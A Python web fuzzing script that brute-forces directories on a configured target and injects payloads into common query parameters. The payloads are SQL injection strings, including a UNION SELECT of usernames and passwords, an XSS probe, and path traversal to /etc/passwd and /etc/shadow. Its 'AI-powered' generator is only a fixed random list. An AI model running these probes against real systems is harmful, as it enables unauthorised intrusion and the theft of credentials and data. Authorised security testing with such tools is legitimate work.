import os
import json
import requests
import time
import random
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load Config
CONFIG_FILE = "config/settings.json"
if not os.path.exists(CONFIG_FILE):
    print(Fore.RED + f"⚠️ Config file {CONFIG_FILE} is missing! Run `setup_config.py`")
    exit(1)

with open(CONFIG_FILE) as config_file:
    config = json.load(config_file)

TARGET = config.get("TARGET", "example.com")
TIMEOUT = config.get("TIMEOUT", 10)
FUZZ_WORDLIST = config.get("FUZZ_WORDLIST", "wordlists/common.txt")

# Load wordlist
def load_wordlist():
    if not os.path.exists(FUZZ_WORDLIST):
        print(Fore.RED + f"⚠️ Wordlist {FUZZ_WORDLIST} not found!")
        return []
    
    with open(FUZZ_WORDLIST, "r") as file:
        return [line.strip() for line in file.readlines()]

# AI-Powered Payload Generator
def generate_ai_payload():
    ai_payloads = [
        "' OR 1=1 --",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "file:///etc/shadow",
        "' UNION SELECT username,password FROM users --"
    ]
    return random.choice(ai_payloads)

# Function to fuzz directories
def fuzz_directories():
    print(Fore.CYAN + f"🔍 Fuzzing directories on {TARGET}...")
    wordlist = load_wordlist()
    discovered_paths = []

    for word in wordlist:
        url = f"http://{TARGET}/{word}"
        try:
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                print(Fore.GREEN + f"✅ Found: {url}")
                discovered_paths.append(url)
            elif response.status_code == 403:
                print(Fore.YELLOW + f"🔒 Forbidden: {url}")
        
        except requests.exceptions.RequestException:
            print(Fore.RED + f"❌ Timeout or error: {url}")

    return discovered_paths

# Function to fuzz parameters
def fuzz_parameters():
    print(Fore.CYAN + f"🔍 Fuzzing parameters on {TARGET}...")
    common_params = ["id", "user", "token", "query", "redirect"]
    discovered_params = []

    for param in common_params:
        payload = generate_ai_payload()
        url = f"http://{TARGET}/search?{param}={payload}"
        
        try:
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200 and payload in response.text:
                print(Fore.GREEN + f"✅ {param} is vulnerable! {url}")
                discovered_params.append({"param": param, "url": url, "payload": payload})
        
        except requests.exceptions.RequestException:
            print(Fore.RED + f"❌ Timeout or error: {url}")

    return discovered_params

# Save Fuzzing Results
def save_results(data):
    os.makedirs("reports", exist_ok=True)
    report_path = f"reports/{TARGET}_fuzzing.json"

    with open(report_path, "w") as report_file:
        json.dump(data, report_file, indent=4)

    print(Fore.GREEN + f"📄 Fuzzing Report saved: {report_path}")

# Main Execution
def main():
    print(Fore.MAGENTA + "🚀 Running AI-Powered Fuzzing...")
    start_time = time.time()

    results = {
        "directories": fuzz_directories(),
        "parameters": fuzz_parameters()
    }
    save_results(results)

    end_time = time.time()
    print(Fore.GREEN + f"✅ Fuzzing completed in {round(end_time - start_time, 2)} seconds.")

if __name__ == "__main__":
    main()
